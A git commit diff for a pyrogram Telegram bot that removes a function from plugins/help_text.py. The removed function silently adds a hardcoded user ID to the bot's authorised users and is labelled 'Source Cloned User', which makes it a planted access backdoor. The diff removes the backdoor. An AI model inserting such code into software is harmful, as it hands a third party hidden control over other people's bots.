6438697997f11b9de68a084c3e912f08842c1f9c
nandu1996 <58746723+nandu1996@users.noreply.github.com>
2019-12-11 00:25:33 +0530

    Update help_text.py

--- plugins/help_text.py
+++ plugins/help_text.py
@@ -25,11 +25,6 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 from helper_funcs.chat_base import TRChatBase
 
-def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(7351948)
-    return expires_at
-
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
 async def help_user(bot, update):
